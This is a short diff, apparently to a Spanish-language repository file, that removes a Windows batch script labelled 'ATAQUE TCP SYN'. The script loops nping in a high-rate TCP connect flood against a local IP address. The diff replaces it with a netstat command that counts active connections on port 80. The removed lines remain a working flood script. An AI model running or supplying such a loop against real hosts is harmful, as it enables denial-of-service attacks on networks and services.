@@ -1,7 +1,6 @@
 # tcpsyn con nping
-@ECHO OFF
-ECHO ATAQUE TCP SYN (c) hackingyseguridad 2016. Version 2.
-ECHO Requiere tener instalado en el PC, nping incluido en Zenmap https://nmap.org/download.html
-:loop
-nping --tcp-connect -rate=90000 -c 900000 -q 192.168.1.252
-goto loop
+
+Ver conexiones activas por ejemplo puerto 80:
+
+netstat -plan|grep :80 | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -n
+
